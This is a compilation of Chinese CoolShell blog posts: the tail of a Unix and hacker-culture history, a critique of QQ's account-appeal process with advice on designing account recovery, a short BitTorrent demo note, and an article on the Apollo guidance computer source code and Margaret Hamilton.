Berkeley计算机科学研究组在1994丢失了自己基金)。这是一个抑压的时代。专有的商业Unix的结果证明那么沉重、那么盲目、那么不适当，以致微软能够用那次等技术的Windows抢走他们生存的空间，拿走他们的干粮。黑客世界的残余力量被逼到了世界上的角落里，苟延残喘。
就在黑客文化日渐衰落之时，美国新闻周刊的资深记者Steven Levy完成了著名的《黑客列传》一书，书中着力介绍了一个人物：Richard M. Stallman的故事，他是麻省理工学院（MIT）人工智能实验室领袖人物，坚决反对实验室的研究成果商业化。他是商业软件社会中坚强的一员，决不随波逐流，建立了全新的黑客文化。Richard M. Stallman（他的登陆名RMS更为人熟知）早在1970年代晚期就已经证明他是当时最有能力的程序员之一。Emacs编辑器就是他众多发明中的一项。RMS的目标是将后1980的松散黑客社群变成一台有组织的社会化机器以达到一个单纯的革命目标。也许他未意识到，他的言行与当年卡尔·马克思号召产业无产阶级反抗工作的努力如出一辙。RMS宣言引发的争论至今仍存于黑客文化中。他的纲要远不止于维护一个代码库，已经暗含了废除软件知识产权主张的精髓。RMS通过“自由软件（free software）”让黑客文化更加有自我意识。当然，这个充满魅力又具争议的人物本身已经成为了一个黑客文化英雄。_只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。_ _——_ 《 _The Art of Unix Programming_ 》 __
RMS让世界上所有的人都知道，入侵电脑系统只是低级不入流的黑客干的事，真正的黑客，是为了自由，为了软件的自由，为了挑战计算机世界中的霸权主义而斗争。他们不是街头小混混，他们更像是绿林好汉，更像是罗宾汉，更像是佐罗。就像渴望民主的人民同专制的政府斗争一样。RMS领导着许多的黑客通过互联网向专有软件发出宣战。X Windows是首批由服务于全球各地不同组织的许多个人以团队形式开发的大规模开源项目之一。电子邮件使创意得以在这个群体中快速传播，问题由此得以快速解决，而开发者可以人尽其才。软件更新可以在数小时之内发送到位，使得每个节点在整个开发过程中步调一致。网络改变了软件的开发模式。另一方面，RMS的理论体系有许多东西非常有争议，他的GPL被认为是一种“病毒式”的协议，BSD的fans和老牌Unix黑客们认为，他们编写Unix的年头都比GPL声明要长得多，GPL依然有太多的限制，而BSD协议则比GPL更加的自由。另一方面，RMS走向了另一个极端，他是完全反版权的，反商业化的。把软件产品从强制收费推向了强制免费、共享和开源，这也为他带来了许多许多的争议。在RMS组织黑客闹革命的年代里，没有多少黑客认同于RMS的理论体系，更多的他们参与GNU只是为了体现那种在互联网上协同工作，令人激动的工作模式。自从GNU设立以来，争议不断，而黑客文化却从未有统一在他的理想体系之下。
自从Linux出现以后，一个新的黑客领袖出现了，Linus Torvalds的中庸态度网聚了世界上顶尖的黑客，其绕过了GPL和反GPL的派系之争，他使用GNU的工具从而以GPL的“传染性”保护了Linux，但他同时也不承认RMS的理论思想体系，他即开源，又支持商业化。虽然，他没有带给黑客们什么重要的思想体系或统一的价值观，但他整合了全世界黑客的阵营，让所有的黑客的行为都围绕着Linux这一事物进行。他以“用自由软件是因为它运行得更好”轻而易举地盖过了“用自由软件是因为所有软件都该是自由的”。1998年初，这种新思潮促使网景公司（Netscape Communications）公布了其Mozilla浏览器的源码。媒体对此事件的关注促成了Linux在华尔街的上市，推动了1999－2001年间科技股的繁荣。事实证明，此事无论对黑客文化的历史还是对Unix的历史都是一个转折点。### Unix的历史教训下面的文字出自《 _The Art of Unix Programming_ 》（Unix编程艺术）。令今天我们所有人所反思。在Unix历史中，最大的规律就是： （看看《谁写了Linux》你就会知道这一规律）
**距开源越近就越繁荣。任何将Unix** **专有化的企图，只能陷入停滞和衰败。**回顾过去，我们早该认识到这一点。1984年至今，我们浪费了十年时间才学到这个教训。如果我们日后不思悔改，可能还得大吃苦头。虽然我们在软件设计这个重要但狭窄的领域比其他人聪明，但这不能使我们摆脱对技术与经济相互作用影响的茫然，而这些就发生在我们的眼皮底下。即使Unix社区中最具洞察力、最具远见卓识的思想家，他们的眼光终究有限。对今后的教训就是： **过度依赖任何一种技术或者商业模式都是错误的** ——相反，保持软件及其设计传统的的灵活性才是长存之道。另一个教训是： **别和低价而灵活的方案较劲** 。或者，换句话说，低档的硬件只要数量足够，就能爬上性能曲线而最终获胜。经济学家Clayton Christensen称之为“破坏性技术”，他在《创新者窘境》（The Innovator’s Dilemma）[Christensen]一书中以磁盘驱动器、蒸汽挖土机和摩托车为例阐明了这种现象的发生。当小型机取代大型机、工作站和服务器取代小型机以及日用Intel机器又取代工作站和服务器时，我们也看到了这种现象。开源运动获得成功正是由于软件的大众化。Unix要繁荣，就必须继续采用吸纳低价而灵活的方案的诀窍，而不是去反对它们。
最后，旧学派的Unix社区因采用了传统的公司组织、财务和市场等命令机制而最终未能实现“职业化”。只有痴迷的“黑客”和具有创造力的怪人结成的反叛联盟才能把我们从愚蠢中拯救出来——他们接着教导我们，真正的专业和奉献精神，正是我们在屈服于世俗观念的“合理商业做法”之前的所作所为。### Unix族谱Unix的故事仍旧延续着……，许多网站也为这段历史留下记录。一个详细记录Unix历史的网站（http://www.levenez.com/unix/），这个网站忠实记载着1969～2005 年Unix发展的大事，而且还有 PDF 档案可供下载，上面有一个庞大的UNIX家族版本树，让人叹为观止。网站的首页陈列每个时期Unix的历史，也代表着无数工程师的心血与努力。下面是一个简单的Unix的族谱：|--AT&T (1969)-----\     |                  |     |              V6 (1976)     |                  |     |              V7 (1979)     |                  |     |   Novell owns AT&T's Unix (by 1994)     |     _____________|____________________     |     |       |      |        |         |     |    AIX    IRIX    SCO   HP-UX   Solaris 2.X     |   (IBM)   (SGI)          (HP)     (Sun)     |     |     |--Berkley (1977)-----\     |                     |     |                  1BSD (1977)     UNIX-|                     |     |                4.4BSD (1993)     |                     |     |                   Net/2     |                     |     |               4.4BSD-Lite (by 1995)     |     ________________|____________________________________     |     |       |          |         |          |            |     |   SunOS   Ultrix   NetBSD    OSF/1   NeXTSTEP   Mac OS X     |   (Sun)   (DEC)   (Various)  (DEC)    (NeXT)    (Apple)     |                   (FreeBSD)     |     |     |--Hybrids----\     |     Linux (Various)     |     |____________________________________________     |    |      |          |              |      |     | RedHat  Debian  Mandrake   Slackware    S.u.S.E.     |                          (Walnut Creek)     |     |_____________________________________________     |        |           |          |        |     MkLinux  LinuxPPC  TurboLinux  OpenLinux  CorelLinux     (Apple)                        (Caldera)   (Corel)
点些查看《Linux 分发包族谱》### Unix的特点现在的文献中提到Unix基本上是说，由Ken Thompson和Dennis Ritchie共同开发的。而通过历史我们也能发现，Unix的主要是由Ken Thompson写下的。但在学术界，Dennis Ritchie的名字往往被排在了Ken Thompson前面的。这就是因为，Dennis Ritchie不但发明了C语言，而且当时他设计Unix操作系统的设计思想，影响了整个世界，直到今天。当时，他们开发UNIX，没有正式立项，是Ken Thompson和Dennis Ritchie等少数几个人偷偷干的，如果一切都要从头从新设计，那几乎是不可能的。所以，Unix吸取与借鉴了Multics的经验，如内核，进程，层次式目录，面向流的I/O，把设备当作文件，……等等。但是Unix在继承中又有创新，比如Unix采用一种无格式的文件结构，文件由字节串加\0组成。这带来两大好处：一是在说明文件时不必加进许多无关的“填充物”，二是任何程序的输出可直接用作其他任何程序的输入，不必经过转换。后面这一点叫做“管道”(piping)，这就是Unix首创的。此外，像把设备当作文件，从而简化了设备管理这一操作系统设计中的难题，虽然不是UNIX的发明，但是实现上它采用了一些新方法，比Multics更高明一些。
下面是Unix的特点：（30多年过去了，这些东西早已变成经典）* **Everything (including hardware) is a file   **所有的事物（甚至硬件本身）都是一个的文件。* **Configuration data stored in text   **以文本形式储存配置数据。* **Small, single-purpose program   **程序尽量朝向小而单一的目标设计* **Avoid captive user interfaces   **尽量避免令人困惑的用户接口* **Ability to chain program together to perform complex tasks   **将几个程序连结起来，处理大而复杂的工作。### Unix的影响和哲学Unix是第三次工业革命中计算机软件领域最具代表性的产物。在这近40年中，由Unix造成的影响是最有深远意义的。就我看来，Unix为软件领域带来了至少以下有积极的东西，由这些东西所引发的直接或间接的事物更是举不胜数。1. 软件开发的若干哲学和思想。   2. 全民参与推动软件，代码共享的模式。   3. 开启了黑客文化和开源项目。   4. 免费和商业的完美结合的Linux。   5. C语言，而后发展的C++，Java等等类C的语言和脚本。（参看《C语言的演变史》）   6. TCP/IP，其的Socket编程已成为今天通用的网络编程主流。（参看《到处都是Unix的胎记》）
不能不说，AT&T虽然发展了Unix，但今天Unix的混乱的局面也和AT&T 有着直接原因。但反过来说，如果没有AT&T的反面教材，今天的GNU/Linux很有可能也不会出现。AT&T究竟是限制了Unix的发展，还是以反面示例促进了Unix社区，已不好评说。今天，软件是商业化好还是开源好的争论还在继续，纵观这几十年来Unix的历史，Linux的划时代地出现。相信你会得出自己的结论。不管怎么样，Unix的经历对计算机领域贡献的不单单是技术，他给我们提供了丰富而生动的教材。特别是Unix引发的哲学，让今天的我们依然受益不浅。说到Unix为我们所带来的软件开发的哲学，我必需要说一说。Unix遵循的原则是KISS（Keep it simple, stupid）。在http://en.wikipedia.org/wiki/Unix_philosophy 上有很多的基本上大同小异的Unix哲学，都是很经典的。Doug McIlroy 是认为UNIX的哲学是这样的：三条哲学，简明扼要，就是这三条哲学贯穿着整个Unix世界。尤其是第一条“do one thing and do it well”真是相当精彩！
* **Write programs that do one thing and do it well.**   * **Write programs to work together.**   * **Write programs to handle text streams, because that is a universal interface.**只要是Unix的程序员，他们会比别的程序员在任何时候都会不停地强调着这三条哲学。而《 _The Art of Unix Programming_ 》总结了下面这些哲学，都是至理名言啊。* Rule of Modularity: Write simple parts connected by clean interfaces.   * Rule of Clarity: Clarity is better than cleverness.   * Rule of Composition: Design programs to be connected to other programs.   * Rule of Separation: Separate policy from mechanism; separate interfaces from engines.   * Rule of Simplicity: Design for simplicity; add complexity only where you must.   * Rule of Parsimony: Write a big program only when it is clear by demonstration that nothing else will do.   * Rule of Transparency: Design for visibility to make inspection and debugging easier.   * Rule of Robustness: Robustness is the child of transparency and simplicity.   * Rule of Representation: Fold knowledge into data so program logic can be stupid and robust.   * Rule of Least Surprise: In interface design, always do the least surprising thing.   * Rule of Silence: When a program has nothing surprising to say, it should say nothing.   * Rule of Repair: When you must fail, fail noisily and as soon as possible.   * Rule of Economy: Programmer time is expensive; conserve it in preference to machine time.   * Rule of Generation: Avoid hand-hacking; write programs to write programs when you can.   * Rule of Optimization: Prototype before polishing. Get it working before you optimize it.   * Rule of Diversity: Distrust all claims for “one true way”.   * Rule of Extensibility: Design for the future, because it will be here sooner than you think.
X Windows 的设计者 Mike Gancarz 给出了下面九条哲学思想1. _Small is beautiful._   2. _Make each program do one thing well._   3. _Build a prototype as soon as possible._   4. _Choose portability over efficiency._   5. _Store data in flat text files._   6. _Use software leverage to your advantage._   7. _Use shell scripts to increase leverage and portability._   8. _Avoid captive user interfaces._   9. _Make every program a filter._在今天，这种思想依然被传承着，在影响着世界上各个角落的每一个程序员。### Unix痛恨者手册这里还需要值得一提的是一本叫《The Unix-Haters Handbook》，中文译做《Unix痛恨者手册》。可以在这里下载：。其中以调侃的语气声讨了Unix的种种不是。虽然这是十年前的一本书了，但还是值得一读。这本书指出了许多Unix的设计错误，指出了种种看起来很合理的设计走向了荒谬，还这样调侃了C语言——“如果说C语言给足了让你上吊的绳子，那么，C++在给了你足够的绳子把你的邻居全部捆起来之后，还给了你足够的绳子让你为一艘小帆船装上帆，最后你还有足够的绳子把自己吊死在帆船的桅杆上”。呵呵，相当的尖酸刻薄吧。里面有一句对操作系统的评价是这样的：“The fundamental difference between Unix and the Macintosh operating system is that **Unix was designed to please programmers** , whereas the Mac was designed to please users. (Windows, on the other hand, was designed to please accountants.”（Windows设计给会计人员？！连计算机用户都不是了，呵呵）
不过，我可以感觉得到这本书的作者在书中对Unix的感情是比较复杂的，爱恨交加，在书的最后有这样一句话“would anyone have spent this much time and effort writing about how much they hated Unix if they didn’t secretly love it? I’ll leave that to the readers to judge, but in the end, it really doesn’t matter: If this book doesn’t kill Unix, nothing will”。是的，如果Unix能够存活这么长的时间，那么，不会有什么东西可以把他消灭了。从《Unix痛恨者手册》这本书，再加上Unix的历史，我们可以感到Unix的经历的风风雨雨，在Unix上面出现有种种教训，近40年的历程，Unix历经磨难，几近夭折，一路走来的确很不容易，让人由衷感叹。今天的Unix，今天的软件工业和以前相比已是不可同日而语。很大程度上，这些都要归功于这个充满苍桑的Unix。### 后记
在中国我们开始学习计算机的时候，我们被Microsoft所创造的文化所笼罩里。就在Unix出现革命性的转变，在Unix影响计算机世界文化的那几年里，科班出生专业开发人员学习的是MS- DOS和微软的文化，我们犹如一个井底之蛙一样，对外面的翻天覆地的变化无动于衷。微软创造的文化在我们这里尤其地根深蒂固，我们几乎忘记了另外一边的Unix（参看《Unix 40年：Unix年鉴》、《Unix 40年：昨天，今天和明天》）。在那充满激情的Unix的岁月里，大伙为了科研目的或个人兴趣在Unix上进行各种开发，并且不计较金钱利益，将这些源码公开，互相共享。在那里，开发和自由成为主题，正因为如此，当今的世界才如此丰富多采。在40年Unix文化和技术积淀的里面，蕴涵着比较纯正的计算机文化和思想。纵观整个Unix的历史过程中，许许多多的程序员、工程师前辈们在Unix中所摸爬滚打，他们的辛勤地、他们呕心沥血地跟随Unix，努力建立一个繁荣的计算机世界的文明。Unix不是一个简简单单的操作系统。有人说，Unix是程序员设计给程序员的，一点没错。Unix的近40年历史造就了它的博大精深，它给程序员们带来的绝不仅仅只是技术上的知识。它的失误，它的无奈，它的精神，它的荣耀，它从技术和思想上都启迪着我们。对于程序员来说，学习Unix就等同于向前辈程序学习。无论你是什么样的程序员，你都应该了解Unix，这是开发人员的根，前面的开发者造就了它，而它又在引领后面的开发人员，它是前辈程序员们交给我们的一份礼物，一个接力棒，它是开发人员赖以生存的土壤，是上一辈程序员留给我们这一代程序员开启未来的钥匙。Unix就像一个程序员教父一样，理当受到我们的尊敬和崇拜。
### 参考资料* Peter H. Salus 的《 _A Quarter Century of UNIX_ 》，这被认为是UNIX的标准历史。   * Eric S. Raymond 的《 _The Art of Unix Programming_ 》   * http://www.wikipedia.org/ 维基百科   *  Computer History   *  Lotsir’s Blog — 《 _Unix &Linux_ _历史重温_ 》   *  《 _黑客文化简史_ 》   *  《 _The UNIX-HATERS Handbook_ 》   *  《 _GNU/Linux Free Software_ 》幻灯片   *  _Dennis M. Ritchie_ 《 _The Evolution of the Unix Time-sharing System_ 》## (转载时请注明作者和出处。未经许可，请勿用于商业用途)# 如何设计“找回用户帐号”功能作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn因为《腾讯帐号申诉的用户体验》一文中好多人觉得腾讯申诉是世界级先进的，并让我拿出一个找回用户的帐号的功能来。本来不想写的，因为大家看看其它系统的就行的，但是，很明显有些人就是很懒，也不会思考，而且不会观察，所以，我就只好写下这篇科普性常识性的文章。
在行文之前，我得先感谢腾讯公司的至少30名员工在《腾讯帐号申诉的用户体验》一文后的回帖（我STFG（Search The Fucking Google）看到了你们使用的那个固定IP在各个大学论坛上的腾讯的招聘广告），我感谢你们主要有两点：1. 你们有半数以上的人留下的是gmail而不是QQMail/Foxmail的电子邮件，这点让我感到很欣慰。   2. 你们在加班到晚上11点的时候都能在本站回复，的确如你们的Andy Pan所说，你们的核心竞争力很强，包括水军方面。好了，让我正式谈谈这个设计。找回用户帐号通常就用三个事就可以了： **邮箱** ， **安全问答** ， **手机** 。#### **邮箱** ， **安全问答** ， **手机**大多数的系统都会使用邮箱和安全问答，这足够了，很多系统直接用邮箱做帐号名（Apple ID，Facebook，新浪微博 ….），这样一来，就算你的系统口令被盗，帐号的是改不掉的，于是你可以用邮箱找回（注：这些系统都会验证你的邮箱是否正确）。但是，如果用邮箱做帐号，会导致你的邮箱暴露了，这样为成为垃圾邮件的受害者，而且如果你还比较2的把邮箱的口令和帐号的口令设置成一样的，那么就相当坑爹了（你可以看看本站的这篇文章——如何设计你的口令）。所以，但凡是用邮箱用为帐号的系统都不会让人看到你的注册邮箱，比如，大家就不知道我新浪微博帐号注册的邮箱，就算是知道也应该是受信的人知道（新浪微博帐号的邮箱地址的默认可见度是“你关注的人”）。
这里要说一下，Google Mail使用的是电子邮件，安全问答 和 手机。你可以使用其中一种找回口令。gmail最漂亮的用户体验是其会提示你，你绑写的邮箱（哪家公司的邮箱和帐号名的第一个字母）和手机（3个尾号）。MSN和gmail相似，也会提示你绑定的邮箱，也可以使用手机，还可以使用你设置好的受信PC，以及通过客户支持（通过客户支持——收集你注册时用的名字，生日，国家地区，安全问题，使用过的口令，最近发送过的邮箱标题，联系人等，或是你绑定过的信用卡信息，但是不会有身份证）。使用手机的一般是安全性比较高的网站，比如：淘宝、Gmail等。这样，使用手机找回口令也不错。因为你注册的安全问答你可能会忘了，你的绑定的邮箱也可能忘了口令，而很多木马可以盗取你的这些电脑上的安全问答或邮箱口令，但是这些木马程序盗不走你的手机（注：在移动互联网时代很可能会盗取你的手机上的信息，但是也盗不走你的手机号——无法像邮箱那样改个口令就盗走了）。你会说，手机还不是会丢失，但是你要明白，你丢失的手机，你是可以停机的，可以通过你的手机密码卡或是身份证恢复你的手机号的。另外， **使用手机的好处还在于，我的系统不需要收信你的真实信息（如：姓名，身份证，住址等），这些真实信息的验证交给移动运营商验证就好了** 。 **在程序设计的里，我们把这种事叫“解耦”** 。Amazon就一种通过电子邮件，然后通过你使用过的信用卡后四位，以及帐单的邮寄的邮政编码，如果你的邮箱变了，没问题，打电话给客服吧，客服会问你的钱行卡号和帐单地址，电子商务的好处就是可以有信用卡或银行卡来恢复号。，因为这 **——把用户的真实信息“解耦”到了银行，并“耦合”和银行方面的安全策略** 。很明显，银行和移动公司的安全级别更高，而且用户也更信任他们。最好不要自己收集用户的真实信息，要是丢失了，你就麻烦了（在国外你就要被起诉了）
在这里，你可能会有疑问，如果我的帐号口令丢失了，那么盗取者会进入我的系统改我的邮箱，改我的手机，改我的信用卡等，那不也一样吗？我想说，对于邮箱和手机，其和密码的级别一样，你改密码的时候，你都要输入旧密码，所以，你改邮箱和手机的时候也要使用旧的邮箱和手机。关于你绑定的银行卡或信用卡号，就算是自己也看不见的（只能看见四个尾号），这就就可以防盗了。当然，盗电子商务帐号的人一般会用你一帐号买东西，但是其会遇到另一个麻烦，那就是要面对银行方面的审计工作——1）对于银行卡通过银行的网银，银行的安全系统会帮你审计。2）对于信用卡则要受到信用卡验证和签名的验证，还能让商家会帮你检查信用卡签名是否正确。一些人说，QQ的帐号申诉过程的“美妙”在于其他尽可能多的收集你的信息，这样一来，反而是安全的，因为密码容易被盗，而你的那么多的信息则不容易被盗。这样认识只对了一半。 **真正的安全系统是协同整个社会的安全系统做出来的一道安全长城，而不是什么都要自己搞** （当然，我们都知道腾讯的DNA就是什么都要自己搞，连FBI和CIA的事也已经在搞了），什么自己都搞反而不安全了。#### 其它讨论Q&A**问题一：通过申诉找回帐号靠不靠谱？**
明显不靠谱，而且还很愚蠢。这反而成了恶意者的温床。他人可以通过申诉让正常人的帐号失效，这是一件多么愚蠢的事啊！（我的QQ帐号前两天不就被这样攻击了吗？）**问题二：通过联系人恢复帐号靠不靠谱？**不全然靠谱，因为你的QQ总是会有陌生人加你，你的邮箱联系人也会有一些你不受信的人。那些人可能就是攻击者的小号。所以，如果你要通过联系人的话，就不要像QQ或MSN那样坑爹的做法，让用户自己来选。而是要像Facebook那样的做法——系统随机挑些人来让你认。**问题三：在注册时设置受信的联系人靠不靠谱？**看似靠谱，但是个人觉得还是还一点问题。因为受信者通过电子信息无法分辨是本人还是盗号者，还要受信者实际联系一下对方。这就好像我们在手机号存电话号码的时候，写上了爸爸，妈妈这样的字眼，这样当恶意者拿了你的手机后，就可以向你的家人敲诈了，因为其直接就可以叫出对方那头的人和被攻击者的关系。**问题四：恢复帐号的时候收集用户的真实信息靠不靠谱？**这要看是什么情况了。如果用户在注册时提供了这些真实信息，就靠谱，如果没有就相当不靠谱。试想：你去银行开户存钱的时候，银行没有让你出示身份证，只让你设了个口令。然后我就可以用我的身份证去重置你的口令。你觉得这个事是不是相当的坑爹？！
**问题五：小白不懂邮件，不懂安全问题，不懂绑定手机啊？**那就用耐心地客服教导这些小白（可参看银行等机构的做法——强制用户输入8位以上的口令，强制使用U盾才能进行大额转帐），提高他们的能力和对安全的认识，当有一天这套东西形成社会标准的时候，安全才会真的到来。安全的问题本来就是双方的事，只有大家都有安全意识，才能做得好。而不是迁就用户。还是Henry Ford的那名话——“如果我问用户要什么，用户会说他要一匹更快的马”，所以这世上也就不会有汽车了。QQ不应该为降低用户安全意识起推动性作用。**问题六：我的经历是什么样的？**我基本不上QQ，我上QQ都是被朋友和同学逼的。因为上周四我想写点关于腾读用户体验的东西，所以我才上QQ想看看，结果发现上不去了，说是帐号被投诉了，让我申诉，我猜想估计和我最早发布的关于腾讯的文章有关系。我1999年来注册的这个QQ号根本没有提交过什么身份证或是地址系统之类的东西，我曾经绑定过手机，大概在5年前绑定过。于是在走申诉流程的过程中，腾讯说的绑定的手机没有被验证过，我还记得曾经我使用我的hotmail邮箱代替过我的QQ号，不过这些在被投诉的面前都不能用了。而我感到腾讯无法知道我提交的这些信息是否真实，又因为我以前曾经帮朋友注册过QQ号(我这些朋友就是腾讯员工说的小白用户)，所以，我就用一些看上去比较真实的但实际是假的信息，并用帮人注册的这些QQ号成功申诉回来了。
有的网友说我不分不清找回密码和申诉的差别，我在这里想说，你分明绑定了手机，但是当你发了短信后却被告诉你的手机没有被验证过。这个就很扯了。于是，我才意识到QQ的这个申诉过程相当的不安全。关于一些细节问题，还请我们的我们腾讯的员工@larry同学给大家更多的细节。**问题七：QQ还有什么样的坑爹的Use Case?**有两个朋友在回复中说到了两个有意思的比较坑爹的Use Case。@gqjjqg 说，他有个朋友被恶意申诉，有段时间和这个恶意申诉者来来回回地申诉这个QQ号，搞了一个多月都没有搞定。最后只得和那个恶意申诉者达成和解才解决了这个事。@Jack Yang说，他有个朋友在网上买了一个QQ号，没过几天就被申诉回去了（毕竟那是别人用过的），然后人家再接着卖，怎么申诉都申诉不回来。欲哭无泪。可见，在QQ的申诉流程下，什么密保，什么手机绑定，都成了浮云。（如果你还有什么样的问题，我可以在继续更新并回答你的问题）——————————希望你现在明白，关于腾讯的帐号申诉过程，看上去相那么回事，实际上漏洞百出。当然，我不能说腾讯是愚蠢的，因为人家搞得那么大的企业，我只能说人家是在下一盘很大的棋……*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language
# BT工作原理演示作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn下面这个网站使用Javascript编写了一个BT工作原理演示动画程序。当然，你可能需要使用Chrome浏览器打开，因为他真的很耗CPU。在我的双核（2GHz）T60电脑上用Chrome打开CPU一下就被耗了50%左右。下面是我截的一个图，每个圆代表一个结点，其会通过其它结点下载需要的文件段。结点中间的那个Bar有点类似于eDonkey中的下载进度条。至于为什么要用像彩虹一样的颜色，主要是为了让你看到不同的段是从不同的结点下载的。你可以按热键S来加入一个下载完了的结点，用P来加入一下空结点，按R来删除一个结点（有点慢，要等10秒左右吧）。BT工作原理演示动画关于其它Javascript的一些小玩意，你可以看看这篇文章。# 50年前的登月程序和程序员有多硬核作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2019年7月20日，是有纪念意义的一天，这天不是因为广大网民帮周杰伦在新浪微博上的超话刷到第一，而是阿波罗登月的50周年的纪念日。早在几年前，在Github上放出了当年Apollo飞船使用的源代码（当然是汇编的），但完全不明白为什么这几天会有一些中国的小朋友到这个github的issue里灌水……，人类历史上这么伟大的一件事，为什么不借这个机会学习一下呢？下面是一些阿波罗登月与程序员相关的小故事，顺着这些东西，你可以把你的周末和精力用得更有价值。
首先，要说的是Apollo 11导航的源代码，这些代码的设计负责人叫Margaret Heafield Hamilton )，是一个女程序员，专业是数学和哲学，1960年得到一个MIT麻省理工大学的临时的软件开发职位，负责在PDP-1和LGP-30上运行天气预报的软件（注：在计算机历史上，PDP系统机器被称为Hack文化的重要推手，PDP-11推了Unix操作系统，而Unix操作系统则是黑客文化的重要产品。参看《Unix传奇》）。然后，她又为美国空军编写探测知敌方飞行的软件，之后，于1965年的时候，她加入了MIT仪器实验室，并成为了这个实验室的主管，这个实验实就是Apollo计划的一部分，她负责编写全新的月球登录的导航软件，以及后来该软件在其他项目中的各个版本。上图是Hamilton站在她和她的麻省理工团队为阿波罗项目制作的导航软件源代码旁边，在Github上的开源的代码 – Apollo-11 （2016年开源）。我们可以看到，有两个重要的目录，一个目录叫“Comanche055”，一个目录叫“Luminary099”，前者是指挥舱用的（英文为 Command Module) ）后者为登月舱用的（英文为 Lunar Module），这里需要说明一下的是，指挥舱是把登录舱推到月球上，在返回的时候，登录舱是被抛弃掉的，而返回到地球的是指挥舱。如果你想看这两份源代码的纸版，你可以访问这两个链接：Comanche 55 AGC Program Listing 和 Luminary 99 REv.1 AGC Program Listing。其中的55 和 90 是各自的build 版本号。
我们细看一下，这些文件的日期是，1969年7月14日，而Apollo 11登月的日期是1969年7月16日起程，7月19日经过月球背面，7月20日下午8点登月。代码写好，两天后就直接上生产，然后就登月，还是导航代码，这代码写的的健壮性得有多强。如果你仔细比较一下这两个目录中的文件，你会发现有些文件是一样的，不但文件名一样，而且内容也一样。这说明这两个模块中的一些东西是相似的。这些代码应该是很难读了，因为当时写这些代码的时候，C语言都没有被发明，所以基本上来说都是汇编代码了，而且还可以发现，这些代码的源文件全是以agc后缀结尾的， 看来这还不是我们平时所了解的汇编，所谓的AGC代表了运行这些代码的计算机 – Apollo Guideance Computer 。沿着这个Wikipedia的链接，你可以看到AGC这个电脑的指令是什么样的，看懂那几条指令后，这些源代码也就能读懂了。当然，因为是写成汇编的，所以，读起来还是要费点神的。不过，其中有一个文件是 `LUNAR_LANDING_GUIDANCE_EQUATIONS.agc` 你会不会很好奇想去看看？打开源文件，你还可以看到每个文件都有很多很多的注释，非常友好，但是也有一些注释比较有趣。这里有一组短视频带你读这些代码 – Exploring the Apollo Guidance Computer(AGC) Code，一供10个小视频，每个2分钟左右，如果你英文听边还行（我觉得很容易听懂），可以看看，了解一下AGC的工作方式，挺有趣意思的。
当时的AGC有32公斤，主频只有2MHz，2K的RAM，36K的ROM。嗯，当年就是这么一个小玩意，把人送上了月球，今天，一个聊天程序就占内存几GB……下面是AGC在Apollo 1指挥舱里的样子（图片截自上面的视频），这个高质量的3D扫描来自 Simithsonian 3D: Apollo 11 Command Module （我觉得美国人干这些事干就是很漂亮啊，这种高清的3D扫描太牛了，如果你仔细看，这个舱里还有宇航员在舱壁上的手写）这个AGC的操作界面又叫DSKY – Display 和 Keyboard的缩写，下图是一个 AGC 模拟器，其官方主页在 源代码在 Github/VirtualAGC。在这个界面上我们可以看到：下面的键盘上左边有两个键，一个是动词Verb一个是名词Noun，Verb指定操作类型，Noun指定要由Verb命令修改的数据。右边的显示器下面有三个5位的数字，这三个数值显示表示航天器姿态的矢量，以及所需速度变化的显示矢量。是的，当年的导航就靠这三个数字和里面的程序了。如果你想了解AGC更多的细节，你可以看看 这篇 AGC for Dummies。这篇文章讲述了AGC这个嵌入式系统的背景和操作指令。一份详细的AGC 汇编语言手册可以让你了解更多的细节。
另外，我在Youtube上找到了一个讲当时Apollo电脑的纪录片 – Navigation Computer，太有趣了。比如：21分51秒开始讲存储用的 Rope Memory 绕线内存，Hamilton 也出来讲了一下在这种内存上编程，画面切到一个人用个比较长的金属针在一个像主板一样的东西上，左右穿梭，就像刺绣一样，但是绣的不是图案，而是程序……太硬核了，真正的通过“硬编织”的方式来写程序。看完上面这个纪录篇，我是非常之惊叹，惊叹于50年前的工程能力，惊叹于50年前这些人面对技术的的一丝不苟，对技术的尊重和严谨的这种精神和方法，一点都不比较今天差。不过，最牛的还不是这个，我在Hamilton的Wikipedia词条上找到了他说的一个事件—— 当年Apollo登陆雷达开关放在了错误的位置，导致AGC收到了不少错误的信号。结果就是AGC既得执行着陆必须的计算，又要接受这些占用其15%时间的额外数据。但是AGC的程序居然可以用高优先级的任务打断低优先级的任务，于是，AGC自动剔除了低级别的任务以保证了重要的任务完成。Hamilton 原话说—— 如果当时的程序不能识别错误并从错误中恢复，我怀疑阿波罗不能成功登月。if the computer hadn’t recognized this problem and taken recovery action, I doubt if Apollo 11 would have been the successful moon landing it was。
看到这里，你有没有觉得——“这个女程序员的一小步，是整个人类的一大步”？Hamilton 的牛逼之外还在于，她是第一个将“软件工程”提出来的人，在MIT，她想让软件开发就像其它工程一样，有相应的工程纪律，给于相关的尊重，于是她创造了Software Engineering这个词。2018年，IEEE在纪念软件工程50周年的时候，他们把 Hamilton 请过去讲了一个叫 What the Errors Tell Us 的主题。她绝对可以称得上是程序员的Pioneer。三年前，Apollo的源代码被开源时候，Twitter有个叫 Lin Clark 的人发了一条推：“我妈50年前的代码被放到Github上了”，虽然，她不是 Hamilton 的女儿，但她妈妈也是Apollo其中一个程序员，现在Lin Clark同样也是一个程序员，目前在 Mozilla工作，Staff Engineer，专长 WebAssembly, Rust, 和 JavaScript ，也是个非常厉害的程序，Youtube上各种演讲，也是一个跟他妈妈一样牛的人。当她在Twitter上这么自豪地发了一条这样的推后，我不知道各位有什么想法？想不想你的后代在未来也会这样自豪的发条微博？
